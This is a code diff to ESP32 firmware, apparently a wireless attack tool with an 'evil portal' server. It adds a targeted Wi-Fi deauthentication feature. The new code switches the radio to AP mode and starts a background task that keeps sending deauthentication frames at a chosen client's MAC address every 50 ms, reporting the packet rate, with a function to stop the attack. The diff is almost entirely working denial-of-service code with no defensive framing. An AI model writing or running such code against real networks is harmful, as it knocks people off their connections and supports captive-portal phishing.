@@ -56,6 +56,7 @@ EventGroupHandle_t wifi_event_group;
 const int WIFI_CONNECTED_BIT = BIT0;
 wifi_ap_record_t selected_ap;
 static station_ap_pair_t selected_station;
+static bool station_selected = false;
 bool redirect_handled = false;
 httpd_handle_t evilportal_server = NULL;
 dns_server_handle_t dns_handle;
@@ -76,6 +77,12 @@ static bool scansta_hopping_active = false;
 // Forward declarations for static channel hopping functions
 static esp_err_t start_scansta_channel_hopping(void);
 static void stop_scansta_channel_hopping(void);
+
+// Station deauthentication task declaration
+static void wifi_deauth_station_task(void *param);
+
+// Globals
+static TaskHandle_t deauth_station_task_handle = NULL;
 
 struct service_info {
     const char *query;
@@ -1531,6 +1538,49 @@ void wifi_manager_select_station(int index) {
            sanitized_ssid,
            selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2],
            selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
+    station_selected = true;
+}
+
+void wifi_manager_deauth_station(void) {
+    if (!station_selected) {
+        wifi_manager_start_deauth();
+        return;
+    }
+    if (deauth_station_task_handle) {
+        printf("Station deauth already running.\n");
+        return;
+    }
+    ap_manager_stop_services(); // stop AP and HTTP server
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP)); // switch to AP mode for deauth
+    ESP_ERROR_CHECK(esp_wifi_start()); // restart Wi-Fi interface without HTTP server
+    printf("Deauthing station %02X:%02X:%02X:%02X:%02X:%02X from AP %02X:%02X:%02X:%02X:%02X:%02X, starting background task...\n",
+           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2], selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
+           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2], selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
+    xTaskCreate(wifi_deauth_station_task, "deauth_station", 4096, NULL, 5, &deauth_station_task_handle);
+    station_selected = false;
+}
+
+// Background task for deauthenticating a selected station and logging packet rate
+static void wifi_deauth_station_task(void *param) {
+    int deauth_channel = 1;
+    wifi_second_chan_t second_chan;
+    esp_err_t ch_err = esp_wifi_get_channel(&deauth_channel, &second_chan);
+    if (ch_err != ESP_OK || deauth_channel < 1 || deauth_channel > SCANSTA_MAX_WIFI_CHANNEL) {
+        deauth_channel = 1; // fallback channel
+    }
+    (void)esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
+    uint32_t last_log = xTaskGetTickCount() * portTICK_PERIOD_MS;
+    for (;;) {
+        wifi_manager_broadcast_deauth(selected_station.ap_bssid, deauth_channel, selected_station.station_mac);
+        vTaskDelay(pdMS_TO_TICKS(50));
+        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
+        if (now - last_log >= 5000) {
+            printf("%" PRIu32 " packets/sec\n", deauth_packets_sent / 5);
+            TERMINAL_VIEW_ADD_TEXT("%" PRIu32 " packets/sec\n", deauth_packets_sent / 5);
+            deauth_packets_sent = 0;
+            last_log = now;
+        }
+    }
 }
 
 #define MAX_PAYLOAD 64
@@ -2968,4 +3018,14 @@ void wifi_manager_scanall_chart() {
 
     printf("\n--- End of Results ---\n\n");
     TERMINAL_VIEW_ADD_TEXT("--- End of Results ---\n\n");
+}
+
+bool wifi_manager_stop_deauth_station(void) {
+    if (deauth_station_task_handle != NULL) {
+        vTaskDelete(deauth_station_task_handle);
+        deauth_station_task_handle = NULL;
+        ap_manager_start_services();
+        return true;
+    }
+    return false;
 }
